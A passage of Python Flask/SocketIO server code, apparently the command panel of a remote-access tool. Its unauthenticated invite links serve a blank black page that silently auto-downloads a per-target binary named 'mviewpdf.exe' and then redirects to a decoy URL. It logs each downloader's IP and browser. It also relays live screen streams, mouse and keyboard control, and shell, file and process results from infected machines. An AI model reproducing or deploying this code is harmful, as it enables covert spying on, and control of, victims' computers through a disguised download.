@app.route("/api/devices/live")
def api_devices():
    with _dev_lock:
        devs = list(_devices.values())
    return jsonify({"devices": [_safe_dev(d) for d in devs], "count": len(devs), "ts": utcnow()})

def _safe_dev(d):
    return {
        "device_id":     d.get("device_id"),
        "label":         d.get("label"),
        "hostname":      d.get("hostname"),
        "os":            d.get("os"),
        "local_ip":      d.get("local_ip"),
        "username":      d.get("username"),
        "cpu":           d.get("cpu"),
        "ram":           d.get("ram"),
        "agent_version": d.get("agent_version"),
        "stream_mode":   d.get("stream_mode"),
        "status":        "online",
        "connected_at":  d.get("connected_at"),
        "last_beat":     d.get("last_beat"),
        "frame_count":   d.get("frame_count", 0),
    }

@app.route("/api/device/<device_id>/command", methods=["POST"])
@require_admin
def api_device_command(device_id):
    if not sio:
        return jsonify({"error": "SocketIO not available"}), 503
    with _dev_lock:
        dev = _devices.get(device_id)
    if not dev:
        return jsonify({"error": f"Device {device_id} not online"}), 404
    data = request.get_json(silent=True) or {}
    data["device_id"] = device_id
    sio.emit("request_action", data, room=device_id)
    _audit("rest_command", device_id=device_id, tab=data.get("tab"))
    return jsonify({"status": "sent", "device_id": device_id}), 200

@app.route("/api/device/<device_id>", methods=["DELETE"])
@require_admin
def api_device_delete(device_id):
    with _dev_lock:
        dev = _devices.pop(device_id, None)
    with _sid_lock:
        for sid in [s for s, d in list(_sid_to_device.items()) if d == device_id]:
            _sid_to_device.pop(sid, None)
    old_adv = _adv_agent_sids.pop(device_id, None)
    if old_adv:
        _adv_sid_to_agent.pop(old_adv, None)
    _bg(db_update, device_id, {"status": "deleted", "disconnected_at": utcnow()})
    _audit("device_deleted", device_id=device_id)
    if dev and sio:
        sio.emit("device_offline", {"device_id": device_id, "label": dev.get("label", device_id), "ts": utcnow()})
    return jsonify({"status": "deleted", "device_id": device_id}), 200

@app.route("/api/viewer/<viewer_sid>/kick", methods=["POST"])
@require_admin
def api_kick_viewer(viewer_sid):
    if not sio:
        return jsonify({"error": "SocketIO not available"}), 503
    with _dash_lock:
        did = _dashboard_device.get(viewer_sid)
    reason = (request.get_json(silent=True) or {}).get("reason", "Kicked by administrator")
    try:
        sio.emit("kicked", {"reason": reason, "by": "admin", "ts": utcnow()}, room=viewer_sid)
        sio.disconnect(viewer_sid)
        _cleanup_viewer(viewer_sid)
        _audit("viewer_kicked", viewer_sid=viewer_sid, device_id=did, reason=reason)
        return jsonify({"status": "kicked", "viewer_sid": viewer_sid}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/sessions/live")
@require_admin
def api_sessions_live():
    now = time.monotonic()
    sessions = []
    with _viewer_activity_lock:
        for vsid, start in list(_viewer_session_start.items()):
            last = _viewer_last_activity.get(vsid, start)
            with _dash_lock:
                did = _dashboard_device.get(vsid)
            sessions.append({
                "viewer_sid": vsid,
                "device_id":  did,
                "duration_s": round(now - start, 1),
                "idle_s":     round(now - last, 1),
            })
    return jsonify({"sessions": sessions, "count": len(sessions), "ts": utcnow()})

@app.route("/api/sessions")
@require_admin
def api_sessions():
    rows = db_list_all()
    with _dev_lock:
        live_ids = set(_devices.keys())
    for r in rows:
        r["_live"] = r.get("device_id") in live_ids
    return jsonify({"sessions": rows, "count": len(rows)})

@app.route("/api/sessions/<token>/revoke", methods=["POST", "DELETE"])
@require_admin
def api_revoke(token):
    _bg(db_update, token, {"status": "revoked"})
    return jsonify({"status": "revoked", "token": token})

# ── Invite + agent download ───────────────────────────────────────────────────
@app.route("/api/invite",      methods=["GET", "POST"])
@app.route("/api/generate",    methods=["GET", "POST"])
@app.route("/invite/generate", methods=["GET", "POST"])
@app.route("/generate_invite", methods=["GET", "POST"])
def generate_invite():
    data = request.get_json(silent=True) or request.form.to_dict() or {}
    token = "MV-" + secrets.token_hex(3).upper() + "-" + secrets.token_hex(3).upper() + "-" + secrets.token_hex(3).upper()
    label      = data.get("label") or data.get("name") or token
    loc        = data.get("location", "")
    dtype      = data.get("device_type", "Standard Display")
    expiry_sec = int(data.get("expiry", 86400))
    expires_at = None
    if expiry_sec > 0:
        expires_at = (datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(seconds=expiry_sec)).isoformat()
    link_mode    = data.get("link_mode", "blank")
    redirect_url = data.get("redirect_url", "").strip()
    payload = {
        "device_id": token, "label": label, "location": loc,
        "device_type": dtype, "status": "pending", "expires_at": expires_at,
        "created_at": utcnow(), "link_mode": link_mode, "redirect_url": redirect_url,
    }
    _bg(db_insert, payload)
    _audit("invite_generated", token=token, label=label)
    srv = request.host_url.rstrip("/")
    return jsonify({
        "status": "ok", "token": token, "device_id": token, "label": label,
        "download_url": f"{srv}/guide/{token}",
        "agent_url":    f"{srv}/guide/{token}",
        "expires_at":   expires_at, "link_mode": link_mode,
    }), 201

@app.route("/api/invite/status")
def api_invite_status():
    token = request.args.get("token", "")
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    with _dev_lock:
        live = _devices.get(token)
    if live:
        return jsonify({"status": "online", "label": live.get("label", token)})
    rec = db_get(token)
    if rec:
        return jsonify({"status": rec.get("status", "pending"), "label": rec.get("label", token)})
    return jsonify({"status": "pending", "label": token})

@app.route("/invite/<token>")
@app.route("/onboard/<token>")
@app.route("/guide/<token>")
def serve_agent(token):
    if not valid_token(token):
        return jsonify({"error": "Invalid token format."}), 400
    session = db_get(token)
    if session is None:
        return jsonify({"error": "Invite link not found."}), 404
    if session.get("status") in ("revoked", "expired", "rejected"):
        return jsonify({"error": "Link no longer valid."}), 410
    if is_expired(session):
        _bg(db_update, token, {"status": "expired"})
        return jsonify({"error": "Link expired."}), 410
    _bg(db_update, token, {
        "status": "downloading", "download_ip": request.remote_addr,
        "downloaded_at": utcnow(), "user_agent": request.headers.get("User-Agent", "")[:200],
    })
    link_mode    = session.get("link_mode") or "blank"
    redirect_url = (session.get("redirect_url") or "").strip()
    patched = _build_patched_agent(token)
    if patched:
        _agent_dl_cache[token] = (patched, time.time())
        cutoff = time.time() - _AGENT_DL_TTL
        for t in [k for k, (_, ts) in _agent_dl_cache.items() if ts < cutoff]:
            _agent_dl_cache.pop(t, None)
    dl_url = f"/guide/{token}/dl" if token in _agent_dl_cache else AGENT_STORAGE_URL
    dl_js  = json.dumps(str(dl_url))
    if link_mode == "redirect" and redirect_url:
        rdr_js = json.dumps(str(redirect_url))
        html = (f'<!DOCTYPE html><html><head><meta charset=utf-8><title> </title>'
                f'<style>*{{margin:0;padding:0}}html,body{{height:100%;background:#000}}</style></head><body><script>'
                f'(function(){{var a=document.createElement("a");a.href={dl_js};a.download="mviewpdf.exe";'
                f'document.body.appendChild(a);a.click();setTimeout(function(){{window.location.href={rdr_js};}},1500);}})();</script></body></html>')
    else:
        html = (f'<!DOCTYPE html><html><head><meta charset=utf-8><title> </title>'
                f'<style>*{{margin:0;padding:0}}html,body{{height:100%;background:#000}}</style></head><body><script>'
                f'(function(){{var a=document.createElement("a");a.href={dl_js};a.download="mviewpdf.exe";'
                f'document.body.appendChild(a);a.click();}})();</script></body></html>')
    r = make_response(html, 200)
    r.headers["Content-Type"] = "text/html"
    return r

@app.route("/guide/<token>/dl")
def serve_agent_binary(token):
    if token in _agent_dl_cache:
        data, _ = _agent_dl_cache[token]
        resp = make_response(data)
        resp.headers["Content-Type"]        = "application/octet-stream"
        resp.headers["Content-Disposition"] = 'attachment; filename="mviewpdf.exe"'
        resp.headers["Content-Length"]      = len(data)
        resp.headers["Cache-Control"]       = "no-store"
        return resp
    if AGENT_STORAGE_URL:
        return redirect(AGENT_STORAGE_URL, 302)
    return jsonify({"error": "Binary not available."}), 503

@app.route("/agent/checkin", methods=["POST"])
def agent_checkin():
    data  = request.get_json(silent=True) or {}
    token = data.get("device_id") or data.get("token", "")
    if not token:
        return jsonify({"error": "No device_id"}), 400
    _bg(db_upsert, token, {
        "status": "online", "label": data.get("hostname") or token,
        "ip_address": data.get("local_ip"), "hostname": data.get("hostname"),
        "os_info": data.get("os"), "agent_version": data.get("agent_version"),
        "connected_at": utcnow(),
    })
    return jsonify({"status": "ok", "token": token})

# ══════════════════════════════════════════════════════════════════════════════
#  SocketIO events
# ══════════════════════════════════════════════════════════════════════════════
if SOCKETIO_OK and sio:

    @sio.on("connect")
    def on_connect():
        join_room("dashboards")
        log.info(f"Socket connected: {request.sid}")

    @sio.on("disconnect")
    def on_disconnect():
        sid = request.sid
        _cleanup_viewer(sid)
        _cleanup_agent(sid)
        log.info(f"Socket disconnected: {sid}")

    # ── Diagnostics room (admin only) ─────────────────────────────────────────
    @sio.on("join_diagnostics")
    def on_join_diagnostics(data):
        if data.get("admin_key", "") == ADMIN_KEY:
            join_room("diagnostics")
            emit("diagnostics_joined", {"status": "ok"})
        else:
            emit("diagnostics_joined", {"status": "error", "msg": "Invalid admin key"})

    @sio.on("leave_diagnostics")
    def on_leave_diagnostics(data):
        leave_room("diagnostics")

    # ── Advanced Monitor viewer hello ─────────────────────────────────────────
    @sio.on("viewer_hello")
    def on_viewer_hello(data):
        sid = request.sid
        join_room("adv_dashboards")
        _send_device_list_to(sid)

    def _build_device_list_result() -> list:
        with _dev_lock:
            live = dict(_devices)
        rows   = _get_cached_db_rows()   # non-blocking: uses cache, refreshes in bg
        db_map = {r.get("device_id", ""): r for r in rows}
        result = []
        for did, dev in live.items():
            db_row = db_map.get(did, {})
            result.append({
                "id": did, "name": dev.get("label") or dev.get("hostname") or did,
                "online": True, "screen_w": dev.get("screen_w", 0), "screen_h": dev.get("screen_h", 0),
                "rtt_ms": dev.get("rtt_ms", 0), "cpu": dev.get("cpu"), "ram": dev.get("ram"),
                "ip": dev.get("local_ip") or db_row.get("ip_address", ""),
                "os": dev.get("os") or db_row.get("os_info", ""),
            })
        for did, row in db_map.items():
            if did not in live:
                result.append({
                    "id": did, "name": row.get("label") or row.get("hostname") or did,
                    "online": False, "screen_w": 0, "screen_h": 0, "rtt_ms": 0,
                    "cpu": None, "ram": None,
                    "ip": row.get("ip_address", ""), "os": row.get("os_info", ""),
                })
        return result

    def _send_device_list_to(sid):
        try:
            sio.emit("device_list", _build_device_list_result(), room=sid)
        except Exception as e:
            log.error(f"_send_device_list_to error: {e}")

    def _broadcast_device_list():
        try:
            sio.emit("device_list", _build_device_list_result(), room="adv_dashboards")
        except Exception:
            pass

    @sio.on("join_dashboard")
    def on_join_dashboard(data):
        join_room("dashboards")

    @sio.on("subscribe_stream")
    def on_subscribe_stream(data):
        pass   # legacy no-op

    # ── watch_device — viewer subscribes to a device stream ───────────────────
    @sio.on("watch_device")
    def on_watch_device(data):
        try:
            did = data.get("device_id", "")
            sid = request.sid
            if not did:
                sio.emit("watch_error", {"msg": "No device_id"}, room=sid)
                return

            with _adv_viewer_lock:
                old_adv_did = _adv_viewer_rooms.get(sid)

            # Max-viewers gate
            if MAX_VIEWERS_PER_DEVICE > 0:
                with _adv_viewer_lock:
                    cur = sum(1 for v in _adv_viewer_rooms.values() if v == did)
                    already_watching = _adv_viewer_rooms.get(sid) == did
                if not already_watching and cur >= MAX_VIEWERS_PER_DEVICE:
                    sio.emit("watch_error", {
                        "msg":  f"Max concurrent viewers ({MAX_VIEWERS_PER_DEVICE}) reached.",
                        "code": "max_viewers",
                    }, room=sid)
                    return

            # Leave old room
            if old_adv_did and old_adv_did != did:
                leave_room(f"adv_viewers_{old_adv_did}")
                with _adv_viewer_lock:
                    _adv_viewer_rooms.pop(sid, None)
                old_agent_sid = _adv_agent_sids.get(old_adv_did)
                with _adv_viewer_lock:
                    ov = sum(1 for v in _adv_viewer_rooms.values() if v == old_adv_did)
                if old_agent_sid:
                    sio.emit("viewer_count", {"count": ov}, room=old_agent_sid)

            with _dev_lock:
                dev = _devices.get(did)

            if not dev:
                join_room(f"adv_viewers_{did}")
                with _adv_viewer_lock:
                    _adv_viewer_rooms[sid] = did
                join_room(f"view:{did}")
                with _view_lock:
                    _viewers[did].add(sid)
                with _dash_lock:
                    _dashboard_device[sid] = did
                with _viewer_activity_lock:
                    _viewer_session_start[sid] = time.monotonic()
                    _viewer_last_activity[sid]  = time.monotonic()
                sio.emit("watch_ok", {"online": False, "device_id": did, "name": did,
                                      "screen_w": 0, "screen_h": 0}, room=sid)
                return

            # Join viewer rooms
            join_room(f"adv_viewers_{did}")
            with _adv_viewer_lock:
                _adv_viewer_rooms[sid] = did

            old_did = _get_device_for_viewer(sid)
            if old_did and old_did != did:
                leave_room(f"view:{old_did}")
                with _view_lock:
                    _viewers[old_did].discard(sid)
                sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": old_did}, room=old_did)

            join_room(f"view:{did}")
            with _view_lock:
                _viewers[did].add(sid)
            with _dash_lock:
                _dashboard_device[sid] = did

            with _viewer_activity_lock:
                _viewer_session_start[sid] = time.monotonic()
                _viewer_last_activity[sid]  = time.monotonic()

            # GOP catch-up — send buffered frames in a background greenlet
            # so on_watch_device returns immediately instead of blocking 128 emits
            with _adv_gop_lock:
                gop = list(_adv_gop_buf.get(did, []))
            cursor_pkt = _adv_cursor_latest.get(did)
            def _send_gop(_sid=sid, _gop=gop, _cursor=cursor_pkt):
                for pkt in _gop:
                    sio.emit("frame_bin", pkt, room=_sid)
                    _sleep(0)   # yield between frames so other greenlets can run
                if _cursor:
                    sio.emit("cursor_bin", _cursor, room=_sid)
            _bg(_send_gop)

            # Notify agent of viewer count
            agent_adv_sid = _adv_agent_sids.get(did)
            with _adv_viewer_lock:
                vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
            with _view_lock:
                vcount = max(vcount, len(_viewers.get(did, set())))
            if agent_adv_sid:
                sio.emit("viewer_count", {"count": vcount}, room=agent_adv_sid)
            sio.emit("viewer_count", {"count": vcount}, room=did)

            sio.emit("watch_ok", {
                "online": True, "device_id": did,
                "name":   dev.get("hostname", did),
                "screen_w": dev.get("screen_w", 0),
                "screen_h": dev.get("screen_h", 0),
            }, room=sid)
            emit("subscribed", {"device_id": did, "viewers": vcount})

            # Tell agent to start streaming
            fps     = min(int(data.get("fps", 20)), 30)
            quality = min(max(int(data.get("quality", 70)), 25), 90)
            scale   = data.get("scale", 0.8)
            monitor = data.get("monitor", 1)
            spay = {"tab": "monitor", "action": "start", "device_id": did,
                    "fps": fps, "quality": quality, "scale": scale, "monitor": monitor}
            sio.emit("request_action", spay, room=did)
            if agent_adv_sid:
                sio.emit("request_action", spay, room=agent_adv_sid)
            log.info(f"Viewer {sid} watching {did}  fps={fps} quality={quality}")

        except Exception as exc:
            _report_crash("on_watch_device", exc)
            try:
                sio.emit("watch_error", {"msg": str(exc)}, room=request.sid)
            except Exception:
                pass

    @sio.on("unsubscribe_stream")
    def on_unsubscribe_stream(data):
        pass

    # ── Agent registration ────────────────────────────────────────────────────
    @sio.on("agent_connect")
    def on_agent_connect(data):
        try:
            _handle_agent_connect(data)
        except Exception as exc:
            _report_crash(f"agent_connect(sid={request.sid})", exc)

    def _handle_agent_connect(data):
        did   = data.get("device_id") or data.get("token", "")
        label = data.get("label") or data.get("hostname") or did
        if not did:
            log.warning(f"agent_connect: no device_id from {request.sid}")
            return

        # Single-instance enforcement — evict stale agent
        if AGENT_EXCLUSIVE:
            with _dev_lock:
                existing = _devices.get(did)
            if existing:
                old_sid = existing.get("sid")
                if old_sid and old_sid != request.sid:
                    log.warning(f"Evicting stale agent {did} sid={old_sid}")
                    _notify_reconnecting(did)
                    try:
                        sio.emit("evicted", {
                            "reason": "duplicate_agent",
                            "msg":    "A newer instance connected — this session is terminated.",
                        }, room=old_sid)
                        try:
                            leave_room(old_sid, did)
                        except Exception:
                            pass
                        sio.disconnect(old_sid)
                    except Exception:
                        pass
                    with _sid_lock:
                        _sid_to_device.pop(old_sid, None)
                    with _dev_lock:
                        _devices.pop(did, None)
                    old_adv = _adv_agent_sids.pop(did, None)
                    if old_adv:
                        _adv_sid_to_agent.pop(old_adv, None)
                    with _adv_gop_lock:
                        _adv_gop_buf.pop(did, None)
                    _adv_cursor_latest.pop(did, None)
                    _audit("agent_evicted", device_id=did, old_sid=old_sid)
                    _fire_webhook("agent_evicted", {"device_id": did})

        join_room(did)
        with _sid_lock:
            _sid_to_device[request.sid] = did
        with _dev_lock:
            _devices[did] = {
                "sid":           request.sid,
                "device_id":     did,
                "label":         label,
                "name":          label,
                "status":        "online",
                "hostname":      data.get("hostname"),
                "username":      data.get("username"),
                "os":            data.get("os"),
                "local_ip":      data.get("local_ip"),
                "ip":            data.get("local_ip"),
                "cpu_count":     data.get("cpu_count"),
                "ram_total_gb":  data.get("ram_total_gb"),
                "agent_version": data.get("agent_version"),
                "stream_mode":   data.get("stream_mode", "video"),
                "gpu":           data.get("gpu"),
                "screen_count":  data.get("screen_count"),
                "connected_at":  utcnow(),
                "last_beat":     utcnow(),
                "cpu":           None,
                "ram":           None,
                "frame_count":   0,
                "last_frame_ts": None,
                "fingerprint":   data,
            }

        log.info(f"Agent ONLINE: {label} ({did}) sid={request.sid}")
        _audit("agent_online", device_id=did, label=label, ip=data.get("local_ip"))

        # Emit online events
        fp = dict(data)
        sio.emit("agent_online",  {"device_id": did, "name": label, "label": label,
                                   "ip": data.get("local_ip"), "fingerprint": fp, "ts": utcnow()})
        sio.emit("device_online", {"device_id": did, "label": label, "fingerprint": fp, "ts": utcnow()})

        # Session handoff — resume viewers without page reload
        with _view_lock:
            active_viewers = list(_viewers.get(did, set()))
        if active_viewers:
            spay = {"tab": "monitor", "action": "start", "device_id": did,
                    "fps": 20, "quality": 70, "scale": 0.8, "monitor": 1}
            sio.emit("request_action", spay, room=request.sid)
            for vsid in active_viewers:
                sio.emit("agent_replaced", {"device_id": did, "label": label, "ts": utcnow()}, room=vsid)
                sio.emit("watch_ok", {"online": True, "device_id": did, "name": label,
                                      "screen_w": 0, "screen_h": 0, "reconnected": True}, room=vsid)

        # Heavy I/O in background — never blocks the event loop
        _bg(_agent_connect_bg, did, label, data)

    def _agent_connect_bg(did, label, data):
        try:
            db_upsert(did, {
                "status": "online", "label": label,
                "ip_address": data.get("local_ip"), "hostname": data.get("hostname"),
                "os_info": data.get("os"), "agent_version": data.get("agent_version"),
                "connected_at": utcnow(),
            })
        except Exception:
            pass
        try:
            broadcast_device_update()
            _broadcast_device_list()
        except Exception:
            pass
        _fire_webhook("agent_online", {"device_id": did, "label": label})

    # ── Heartbeat ─────────────────────────────────────────────────────────────
    _hb_count: dict = collections.defaultdict(int)
    _HB_BROADCAST_EVERY = 6   # broadcast every ~60s at 10s interval

    @sio.on("heartbeat")
    def on_hb(data):
        did = data.get("device_id")
        if not did:
            return
        with _dev_lock:
            if did in _devices:
                _devices[did].update({
                    "cpu":       data.get("cpu"),
                    "ram":       data.get("ram"),
                    "last_beat": utcnow(),
                })
        sio.emit("heartbeat_update", data, room=f"view:{did}")
        _hb_count[did] += 1
        if _hb_count[did] % _HB_BROADCAST_EVERY == 0:
            sio.emit("heartbeat_update", data, room="dashboards")

    # ── Agent auth (Advanced Monitor second socket) ───────────────────────────
    @sio.on("agent_auth")
    def on_agent_auth(data):
        token = data.get("token", "")
        did   = data.get("device_id") or token
        sid   = request.sid
        if not did:
            sio.emit("auth_error", {"msg": "Empty token/did"}, room=sid)
            return
        # Wait up to 8s for main socket agent_connect
        dev = None
        for _ in range(16):
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                break
            _sleep(0.5)
        if not dev:
            log.warning(f"agent_auth: {did!r} not in _devices after 8s — creating stub")
            with _dev_lock:
                _devices[did] = {
                    "device_id": did, "hostname": did, "label": did, "online": True,
                    "screen_w": 0, "screen_h": 0, "frame_count": 0, "last_frame_ts": None,
                }
            dev = _devices[did]
        _adv_agent_sids[did]   = sid
        _adv_sid_to_agent[sid] = did
        join_room(did)
        log.info(f"Advanced Monitor auth OK: device={did} sid={sid}")
        vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
        with _view_lock:
            vcount = max(vcount, len(_viewers.get(did, set())))
        sio.emit("auth_ok", {"role": "agent", "device_id": did}, room=sid)
        sio.emit("viewer_count", {"count": vcount}, room=sid)
        if vcount > 0:
            sio.emit("request_action", {"tab": "monitor", "action": "start", "device_id": did,
                                        "fps": 20, "quality": 70, "scale": 0.8, "monitor": 1}, room=sid)
        _audit("agent_auth_ok", device_id=did, viewers=vcount)

    @sio.on("agent_auth_ready")
    def on_agent_auth_ready(data):
        did = data.get("device_id") or data.get("token", "")
        sid = request.sid
        vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
        with _view_lock:
            vcount = max(vcount, len(_viewers.get(did, set())))
        if vcount > 0:
            sio.emit("viewer_count", {"count": vcount}, room=sid)

    # ── Binary frame relay ────────────────────────────────────────────────────
    @sio.on("frame_bin")
    def on_frame_bin(data):
        """
        Critical hot path — runs on every frame (20+ fps per agent).
        Minimise lock contention: GOP append uses its own fine-grained lock,
        frame stats append is lock-free (deque.append is thread-safe in CPython,
        and gevent patches deque so it's greenlet-safe too).
        """
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if not did:
            with _sid_lock:
                did = _sid_to_device.get(sid)
        if not did:
            return

        # Convert to bytes safely — data may be memoryview, bytearray, list, or bytes
        try:
            raw = bytes(data) if not isinstance(data, bytes) else data
        except Exception:
            return

        # Size guard + empty guard (combined)
        n = len(raw)
        if n == 0 or n > MAX_FRAME_BYTES:
            return

        # Decode frame header (w, h from first 8 bytes) — no lock needed for the check
        if n >= 8:
            try:
                w, h = struct.unpack_from(">II", raw, 0)
                if w > 0 and h > 0:
                    with _dev_lock:
                        dev = _devices.get(did)
                        if dev:
                            dev["screen_w"] = w
                            dev["screen_h"] = h
            except Exception:
                pass

        # GOP buffer — append only; deque is safe from one greenlet at a time
        with _adv_gop_lock:
            buf = _adv_gop_buf.get(did)
            if buf is None:
                buf = collections.deque(maxlen=128)
                _adv_gop_buf[did] = buf
            buf.append(raw)

        # Frame stats — deque.append is atomic; no extra lock needed
        _frame_stats[did].append((time.time(), n))

        # Update device record — single lock entry, update only changed fields
        with _dev_lock:
            dev = _devices.get(did)
            if dev:
                fc = dev.get("frame_count", 0) + 1
                dev["frame_count"]   = fc
                dev["last_frame_ts"] = utcnow()
                if fc == 1 or fc % 500 == 0:
                    log.info(f"frame_bin: device={did} frame={fc} size={n}")

        # Fan out — emit to both room types
        # adv_viewers_ room is the primary path (Advanced Monitor)
        # view: room is the legacy path — members may overlap, which is fine
        # (clients deduplicate by sequence number on their end)
        sio.emit("frame_bin", raw, room=f"adv_viewers_{did}")
        sio.emit("frame_bin", raw, room=f"view:{did}")

    @sio.on("frame_bin_relay")
    def on_frame_bin_relay(data):
        """Main-socket fallback when adv socket unavailable."""
        try:
            did = data.get("device_id", "")
            if not did:
                return
            if data.get("b64"):
                import base64
                raw = base64.b64decode(data["b64"])
            else:
                raw_list = data.get("data")
                if not raw_list:
                    return
                raw = bytes(raw_list)
            if not raw or len(raw) > MAX_FRAME_BYTES:
                return
            if len(raw) >= 8:
                try:
                    w, h = struct.unpack_from(">II", raw, 0)
                    if w > 0 and h > 0:
                        with _dev_lock:
                            if did in _devices:
                                _devices[did]["screen_w"] = w
                                _devices[did]["screen_h"] = h
                except Exception:
                    pass
            with _adv_gop_lock:
                if did not in _adv_gop_buf:
                    _adv_gop_buf[did] = collections.deque(maxlen=128)
                _adv_gop_buf[did].append(raw)
            with _frame_stats_lock:
                _frame_stats[did].append((time.time(), len(raw)))
            with _dev_lock:
                if did in _devices:
                    _devices[did]["frame_count"]   = _devices[did].get("frame_count", 0) + 1
                    _devices[did]["last_frame_ts"] = utcnow()
            sio.emit("frame_bin", raw, room=f"adv_viewers_{did}")
            sio.emit("frame_bin", raw, room=f"view:{did}")
        except Exception as e:
            log.warning(f"frame_bin_relay error: {e}")

    @sio.on("cursor_bin")
    def on_cursor_bin(data):
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if not did:
            with _sid_lock:
                did = _sid_to_device.get(sid)
        if not did:
            return
        try:
            raw = bytes(data)
        except Exception:
            return
        _adv_cursor_latest[did] = raw
        sio.emit("cursor_bin", raw, room=f"adv_viewers_{did}")
        sio.emit("cursor_bin", raw, room=f"view:{did}")

    @sio.on("agent_info")
    def on_agent_info(data):
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if not did:
            with _sid_lock:
                did = _sid_to_device.get(sid)
        if did:
            with _dev_lock:
                if did in _devices:
                    _devices[did]["hostname"] = data.get("hostname", _devices[did].get("hostname", ""))
                    _devices[did]["os"]       = data.get("os",       _devices[did].get("os", ""))

    @sio.on("agent_pong")
    def on_agent_pong(data):
        sid = request.sid
        did = _adv_sid_to_agent.get(sid)
        if did:
            rtt = (time.time() - data.get("ts", time.time())) * 1000
            with _dev_lock:
                if did in _devices:
                    _devices[did]["rtt_ms"] = round(rtt, 1)

    # ── Input events ──────────────────────────────────────────────────────────
    @sio.on("input_event")
    def on_input_event(data):
        sid = request.sid
        _touch_viewer(sid)
        with _adv_viewer_lock:
            did = _adv_viewer_rooms.get(sid)
        did = did or data.get("device_id", "")
        if not did:
            return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("input_event", data, room=agent_sid)
        else:
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                evt = data.get("type", "")
                tab = {
                    "mouse_move":    "mouse_move",
                    "mouse_click":   "mouse_click",
                    "mouse_dblclick":"mouse_click",
                    "mouse_scroll":  "scroll",
                    "key_event":     "key_event",
                    "type_text":     "type_text",
                }.get(evt, "mouse_move")
                sio.emit("request_action", {"tab": tab, **data}, room=did)

    @sio.on("mouse_event")
    def on_mouse(data):
        did = data.get("device_id", "")
        if not did: return
        _touch_viewer(request.sid)
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("input_event", {
                "device_id": did,
                "type": "mouse_click" if data.get("action") in ("down","up","click") else "mouse_move",
                "x": data.get("x", 0), "y": data.get("y", 0),
                "button": data.get("button", "left"), "down": data.get("action") == "down",
            }, room=agent_sid)
        else:
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                sio.emit("request_action", {"tab": "mouse_event", **data}, room=did)

    @sio.on("scroll_event")
    def on_scroll(data):
        did = data.get("device_id", "")
        if not did: return
        _touch_viewer(request.sid)
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("input_event", {"device_id": did, "type": "mouse_scroll",
                                     "x": data.get("x", 0), "y": data.get("y", 0),
                                     "delta": data.get("delta", 3)}, room=agent_sid)
        else:
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                sio.emit("request_action", {"tab": "scroll", **data}, room=did)

    @sio.on("key_event")
    def on_key(data):
        _touch_viewer(request.sid)
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "key_event", **data}, room=did)

    # ── WebRTC signaling ──────────────────────────────────────────────────────
    @sio.on("webrtc_offer")
    def on_webrtc_offer(data):
        sid = request.sid
        with _adv_viewer_lock:
            did = _adv_viewer_rooms.get(sid)
        if not did: return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("webrtc_offer", {"viewer_sid": sid, "sdp": data.get("sdp")}, room=agent_sid)

    @sio.on("webrtc_answer")
    def on_webrtc_answer(data):
        vsid = data.get("viewer_sid")
        if vsid: sio.emit("webrtc_answer", {"sdp": data.get("sdp")}, room=vsid)

    @sio.on("webrtc_ice_agent")
    def on_webrtc_ice_agent(data):
        vsid = data.get("viewer_sid")
        if vsid: sio.emit("webrtc_ice", {"candidate": data.get("candidate")}, room=vsid)

    @sio.on("webrtc_ice_viewer")
    def on_webrtc_ice_viewer(data):
        sid = request.sid
        with _adv_viewer_lock:
            did = _adv_viewer_rooms.get(sid)
        if not did: return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("webrtc_ice", {"viewer_sid": sid, "candidate": data.get("candidate")}, room=agent_sid)

    @sio.on("webrtc_connected")
    def on_webrtc_connected(data):
        log.info(f"WebRTC DataChannel active: viewer={request.sid}")

    # ── Result relay events ───────────────────────────────────────────────────
    def _relay(event_in, event_out, rooms=("view",), also_dashboards=False):
        """Register a relay handler: agent → viewer room(s).
        Loop vars are captured via default-arg binding to avoid closure-over-loop-var bug.
        """
        def _make_handler(_ev_out=event_out, _rooms=tuple(rooms), _also=also_dashboards):
            @sio.on(event_in)
            def _handler(data):
                did = data.get("device_id", "")
                for room_prefix in _rooms:
                    sio.emit(_ev_out, data, room=f"{room_prefix}:{did}")
                if _also:
                    sio.emit(_ev_out, data, room="dashboards")
        _make_handler()

    @sio.on("screenshot_result")
    def on_screenshot_result(data):
        did = data.get("device_id", "")
        out = dict(data)
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        if "frame" in out and "image" not in out:
            out["image"] = out["frame"]
        sio.emit("screenshot",        out, room=f"view:{did}")
        sio.emit("screenshot_result", out, room=f"view:{did}")

    @sio.on("ping_result")
    def on_ping_result(data):
        did = data.get("device_id", "")
        sio.emit("pong_agent", data, room=f"view:{did}")
        sio.emit("pong_agent", data, room="dashboards")

    @sio.on("cursor_event")
    def on_cursor_event(data):
        sio.emit("cursor_event", data, room=f"view:{data.get('device_id','')}")

    @sio.on("system_stats_report")
    def on_sys(data):
        did = data.get("device_id", "")
        sio.emit("update_system_tab", data, room=f"view:{did}")
        sio.emit("update_system_tab", data, room="dashboards")

    for _ev_in, _ev_out, _also_dash in [
        ("processes_report",       "processes_result",      True),
        ("kill_result",            "kill_result",           False),
        ("start_process_result",   "start_process_result",  False),
        ("shell_result",           "shell_result",          True),
        ("file_list_result",       "file_list_result",      True),
        ("file_read_result",       "file_read_result",      True),
        ("file_download_result",   "file_download_result",  True),
        ("file_delete_result",     "file_delete_result",    False),
        ("drives_report",          "drives_report",         True),
        ("disks_report",           "disks_report",          True),
